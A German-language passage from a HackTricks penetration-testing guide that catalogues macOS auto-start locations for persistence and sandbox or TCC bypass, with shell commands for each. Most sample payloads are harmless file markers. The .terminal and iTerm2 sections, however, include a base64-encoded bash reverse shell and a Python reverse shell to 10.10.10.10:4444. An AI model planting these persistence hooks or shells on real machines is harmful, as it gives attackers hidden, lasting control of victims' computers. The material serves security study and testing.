# macOS Auto Start

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

Dieser Abschnitt basiert stark auf der Blog-Serie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Das Ziel ist es, **weitere Autostart-Locations** hinzuzufügen (wenn möglich), anzuzeigen, **welche Techniken** heutzutage mit der neuesten Version von macOS (13.4) **noch funktionieren** und die **benötigten Berechtigungen** anzugeben.

## Sandbox-Bypass

{% hint style="success" %}
Hier finden Sie Startorte, die für den **Sandbox-Bypass** nützlich sind. Dadurch können Sie einfach etwas ausführen, indem Sie es in eine Datei schreiben und auf eine sehr **häufige Aktion**, eine bestimmte **Zeitmenge** oder eine **Aktion, die Sie normalerweise** innerhalb einer Sandbox ohne Root-Berechtigungen ausführen können, **warten**.
{% endhint %}

### Launchd

* Nützlich für Sandbox-Bypass: [✅](https://emojipedia.org/check-mark-button)
* TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

* **`/Library/LaunchAgents`**
* **Auslöser**: Neustart
* Root-Berechtigungen erforderlich
* **`/Library/LaunchDaemons`**
* **Auslöser**: Neustart
* Root-Berechtigungen erforderlich
* **`/System/Library/LaunchAgents`**
* **Auslöser**: Neustart
* Root-Berechtigungen erforderlich
* **`/System/Library/LaunchDaemons`**
* **Auslöser**: Neustart
* Root-Berechtigungen erforderlich
* **`~/Library/LaunchAgents`**
* **Auslöser**: Neu anmelden
* **`~/Library/LaunchDemons`**
* **Auslöser**: Neu anmelden

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste** Prozess, der vom OX S-Kernel beim Start ausgeführt wird und der letzte, der beim Herunterfahren beendet wird. Es sollte immer die **PID 1** haben. Dieser Prozess wird die in den **ASEP-Plists** angegebenen Konfigurationen in folgenden Verzeichnissen **lesen und ausführen**:

* `/Library/LaunchAgents`: Vom Administrator installierte benutzerbezogene Agents
* `/Library/LaunchDaemons`: Vom Administrator installierte systemweite Daemons
* `/System/Library/LaunchAgents`: Von Apple bereitgestellte benutzerbezogene Agents.
* `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, werden die in `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` befindlichen Plists mit den **Berechtigungen des angemeldeten Benutzers** gestartet.

Der **Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents geladen werden, wenn sich der Benutzer anmeldet, und Daemons beim Systemstart geladen werden** (da es Dienste wie SSH gibt, die vor dem Zugriff eines Benutzers auf das System ausgeführt werden müssen). Agents können auch eine GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent vor der Anmeldung des Benutzers ausgeführt werden muss**, diese werden als **PreLoginAgents** bezeichnet. Zum Beispiel ist dies nützlich, um unterstützende Technologien bei der Anmeldung bereitzustellen. Sie können auch in `/Library/LaunchAgents` gefunden werden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

{% hint style="info" %}
Neue Daemon- oder Agent-Konfigurationsdateien werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung** mit `launchctl -F <file>` zu laden (jedoch werden diese plist-Dateien nach dem Neustart nicht automatisch geladen).\
Es ist auch möglich, mit `launchctl unload <target.plist>` zu **entladen** (der Prozess, auf den er zeigt, wird beendet).

Um sicherzustellen, dass **nichts** (wie eine Überschreibung) **das Ausführen** eines **Agenten** oder **Daemons** **verhindert**, führen Sie Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Liste alle von dem aktuellen Benutzer geladenen Agenten und Daemons auf:
```bash
launchctl list
```
{% hint style="warning" %}
Wenn eine plist einem Benutzer gehört, wird die Aufgabe auch dann als Benutzer und nicht als Root ausgeführt, wenn sie sich in einem systemweiten Daemon-Ordner befindet. Dadurch können einige Privileg-Eskalations-Angriffe verhindert werden.
{% endhint %}

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
* Aber du musst eine App finden, die einen TCC-Bypass hat und eine Shell ausführt, die diese Dateien lädt

#### Speicherorte

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Auslöser**: Öffne ein Terminal mit zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Auslöser**: Öffne ein Terminal mit zsh
* Root erforderlich
* **`~/.zlogout`**
* **Auslöser**: Beende ein Terminal mit zsh
* **`/etc/zlogout`**
* **Auslöser**: Beende ein Terminal mit zsh
* Root erforderlich
* Möglicherweise mehr in: **`man zsh`**
* **`~/.bashrc`**
* **Auslöser**: Öffne ein Terminal mit bash
* `/etc/profile` (funktionierte nicht)
* `~/.profile` (funktionierte nicht)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Auslöser**: Sollte mit xterm ausgelöst werden, aber es **ist nicht installiert** und selbst nach der Installation wird dieser Fehler angezeigt: xterm: `DISPLAY is not set`

#### Beschreibung & Ausnutzung

Beim Initialisieren einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Diese Shell wird automatisch aufgerufen, wenn die Terminalanwendung gestartet wird oder wenn auf ein Gerät über SSH zugegriffen wird. Obwohl `bash` und `sh` auch in macOS vorhanden sind, müssen sie explizit aufgerufen werden, um verwendet zu werden.

Die Manpage von zsh, die wir mit **`man zsh`** lesen können, enthält eine ausführliche Beschreibung der Startdateien.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Wiedereröffnete Anwendungen

{% hint style="danger" %}
Die Konfiguration der angegebenen Ausnutzung und das Abmelden und erneute Anmelden oder sogar das Neustarten haben bei mir nicht funktioniert, um die App auszuführen. (Die App wurde nicht ausgeführt, vielleicht muss sie während dieser Aktionen ausgeführt werden)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Auslöser**: Neustart der Anwendungen

#### Beschreibung & Ausnutzung

Alle Anwendungen, die wieder geöffnet werden sollen, befinden sich in der Plist-Datei `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Um also Ihre eigene Anwendung starten zu lassen, müssen Sie diese einfach **zur Liste hinzufügen**.

Die UUID kann durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` gefunden werden.

Um die Anwendungen zu überprüfen, die wieder geöffnet werden, können Sie Folgendes tun:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um eine Anwendung zu dieser Liste hinzuzufügen, können Sie Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal-Einstellungen

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Terminal verwendet die FDA-Berechtigungen des Benutzers, der es verwendet

#### Standort

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers in den Anwendungen gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, um **andere Anwendungen/Scripts auszuführen**.

Zum Beispiel kann das Terminal einen Befehl beim Start ausführen:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt reflektiert:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
So, wenn die Plist der Einstellungen des Terminals im System überschrieben werden kann, kann die **`open`**-Funktionalität verwendet werden, um das Terminal zu öffnen und dieser Befehl wird ausgeführt.

Sie können dies über die Befehlszeile mit folgendem Befehl hinzufügen:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal-Skripte / Andere Dateierweiterungen

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Terminal verwendet die FDA-Berechtigungen des Benutzers, der es verwendet

#### Ort

* **Überall**
* **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

Wenn Sie ein [**`.terminal`**-Skript](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) erstellen und öffnen, wird die **Terminal-Anwendung** automatisch aufgerufen, um die darin angegebenen Befehle auszuführen. Wenn die Terminal-App einige spezielle Berechtigungen hat (wie TCC), wird Ihr Befehl mit diesen speziellen Berechtigungen ausgeführt.

Probieren Sie es mit:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Du könntest auch die Erweiterungen **`.command`** und **`.tool`** verwenden, mit regulären Shell-Skripten, und sie werden auch vom Terminal geöffnet.

{% hint style="danger" %}
Wenn das Terminal **Vollzugriff auf die Festplatte** hat, kann es diese Aktion ausführen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar sein wird).
{% endhint %}

### Audio-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

* **`/Library/Audio/Plug-Ins/HAL`**
* Root-Zugriff erforderlich
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`/Library/Audio/Plug-ins/Components`**
* Root-Zugriff erforderlich
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`~/Library/Audio/Plug-ins/Components`**
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`/System/Library/Components`**
* Root-Zugriff erforderlich
* **Auslöser**: Neustart von coreaudiod oder des Computers

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und sie zu laden.

### QuickLook-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Ausnutzung

QuickLook-Plugins können ausgeführt werden, wenn du die Vorschau einer Datei auslöst (Leertaste drücken, wenn die Datei in Finder ausgewählt ist) und ein **Plugin, das diesen Dateityp unterstützt**, installiert ist.

Es ist möglich, dein eigenes QuickLook-Plugin zu kompilieren, es an einem der vorherigen Speicherorte abzulegen, um es zu laden, und dann zu einer unterstützten Datei zu gehen und die Leertaste zu drücken, um es auszulösen.

### ~~Anmelde-/Abmelde-Hooks~~

{% hint style="danger" %}
Das hat bei mir nicht funktioniert, weder mit dem Benutzer-LoginHook noch mit dem Root-LogoutHook.
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

* Du musst in der Lage sein, etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` auszuführen
* Befindet sich in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Um es zu löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Der Root-Benutzer wird in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Bedingter Sandbox-Bypass

{% hint style="success" %}
Hier finden Sie Startorte, die nützlich sind, um den **Sandbox-Bypass** zu ermöglichen, indem Sie einfach etwas ausführen, indem Sie es in eine Datei schreiben und **nicht sehr häufige Bedingungen** erwarten, wie spezifische **installierte Programme, "ungewöhnliche" Benutzer**-Aktionen oder Umgebungen.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Nützlich für Sandbox-Bypass: [✅](https://emojipedia.org/check-mark-button)
* Sie müssen jedoch in der Lage sein, das `crontab`-Binärprogramm auszuführen
* Oder Root sein
* TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root-Berechtigungen erforderlich für direkten Schreibzugriff. Keine Root-Berechtigungen erforderlich, wenn Sie `crontab <Datei>` ausführen können.
* **Auslöser**: Hängt von der Cron-Job ab

#### Beschreibung & Ausnutzung

Listen Sie die Cron-Jobs des **aktuellen Benutzers** auf mit:
```bash
crontab -l
```
Sie können auch alle Cron-Jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** (erfordert Root-Zugriff) einsehen.

In MacOS finden Sie mehrere Ordner, die Skripte mit **bestimmter Häufigkeit** ausführen, in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hier finden Sie die regulären **cron** **Jobs**, die **at** **Jobs** (nicht sehr gebräuchlich) und die **periodischen** **Jobs** (hauptsächlich zur Bereinigung temporärer Dateien verwendet). Die täglichen periodischen Jobs können zum Beispiel mit `periodic daily` ausgeführt werden.

Um einen **Benutzer-Cronjob programmgesteuert** hinzuzufügen, können Sie Folgendes verwenden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 verwendet gewährte TCC-Berechtigungen

#### Speicherorte

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Auslöser**: iTerm öffnen
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Auslöser**: iTerm öffnen
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Auslöser**: iTerm öffnen

#### Beschreibung & Ausnutzung

Skripte, die in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeichert sind, werden ausgeführt. Zum Beispiel:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oder:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Skript **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Einstellungen befinden sich in **`~/Library/Preferences/com.googlecode.iterm2.plist`** und können **einen auszuführenden Befehl angeben**, wenn das iTerm2-Terminal geöffnet wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen reflektiert:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Sie können den Befehl zur Ausführung festlegen mit:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Es ist sehr wahrscheinlich, dass es **andere Möglichkeiten gibt, die iTerm2-Einstellungen** zu missbrauchen, um beliebige Befehle auszuführen.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber xbar muss installiert sein
* TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Zugriffsberechtigungen für Barrierefreiheit an

#### Standort

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, ist es möglich, ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** zu schreiben, das ausgeführt wird, wenn xbar gestartet wird:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Hammerspoon muss installiert sein
* TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Zugriffsberechtigungen für die Barrierefreiheit an

#### Standort

* **`~/.hammerspoon/init.lua`**
* **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und nutzt die **LUA-Skriptsprache** für seine Operationen. Es unterstützt die Integration von vollständigem AppleScript-Code und die Ausführung von Shell-Skripten, was seine Skripting-Fähigkeiten erheblich verbessert.

Die App sucht nach einer einzigen Datei, `~/.hammerspoon/init.lua`, und wenn sie gestartet wird, wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber SSH muss aktiviert und verwendet werden
* TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
* SSH wurde verwendet, um FDA-Zugriff zu haben

#### Standort

* **`~/.ssh/rc`**
* **Auslöser**: Anmeldung über SSH
* **`/etc/ssh/sshrc`**
* Root-Berechtigung erforderlich
* **Auslöser**: Anmeldung über SSH

{% hint style="danger" %}
Um SSH einzuschalten, ist Vollzugriff auf die Festplatte erforderlich:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Beschreibung & Ausnutzung

Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, es sei denn, `PermitUserRC no` ist in der Datei `/etc/ssh/sshd_config` festgelegt, wenn sich ein Benutzer über SSH anmeldet.

### **Anmeldeobjekte**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen `osascript` mit Argumenten ausführen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Auslöser:** Anmeldung
* Exploit-Payload wird durch Aufruf von **`osascript`** gespeichert
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Auslöser:** Anmeldung
* Root-Berechtigung erforderlich

#### Beschreibung

In den Systemeinstellungen -> Benutzer & Gruppen -> **Anmeldeobjekte** können Sie **Objekte finden, die beim Anmelden des Benutzers ausgeführt werden sollen**.\
Es ist möglich, sie über die Befehlszeile aufzulisten, hinzuzufügen und zu entfernen:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Elemente werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert.

**Anmeldeobjekte** können auch über die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angegeben werden, die die Konfiguration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** speichert.

### ZIP als Anmeldeobjekt

(Siehe vorherigen Abschnitt über Anmeldeobjekte, dies ist eine Erweiterung)

Wenn Sie eine **ZIP**-Datei als **Anmeldeobjekt** speichern, wird das **`Archive-Dienstprogramm`** es öffnen und wenn die ZIP-Datei beispielsweise in **`~/Library`** gespeichert war und den Ordner **`LaunchAgents/file.plist`** mit einer Hintertür enthielt, wird dieser Ordner erstellt (standardmäßig nicht vorhanden) und die plist wird hinzugefügt, so dass beim nächsten Mal, wenn sich der Benutzer erneut anmeldet, die in der plist angegebene **Hintertür ausgeführt wird**.

Eine andere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im Benutzer-HOME zu erstellen, so dass diese Technik auch dann funktionieren würde, wenn der Ordner LaunchAgents bereits vorhanden ist.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen **`at`** **ausführen** und es muss **aktiviert** sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* Sie müssen **`at`** **ausführen** und es muss **aktiviert** sein

#### **Beschreibung**

`at`-Aufgaben sind für die **Planung einmaliger Aufgaben** vorgesehen, die zu bestimmten Zeiten ausgeführt werden sollen. Im Gegensatz zu Cron-Jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Es ist wichtig zu beachten, dass diese Aufgaben über Systemneustarts hinweg persistent sind und unter bestimmten Bedingungen potenzielle Sicherheitsbedenken darstellen.

Standardmäßig sind sie **deaktiviert**, aber der **Root**-Benutzer kann sie mit folgendem Befehl **aktivieren**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dies wird eine Datei in 1 Stunde erstellen:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Überprüfen Sie die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Oben sehen wir zwei geplante Aufgaben. Wir können die Details der Aufgabe mit `at -c JOBNUMMER` ausdrucken.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
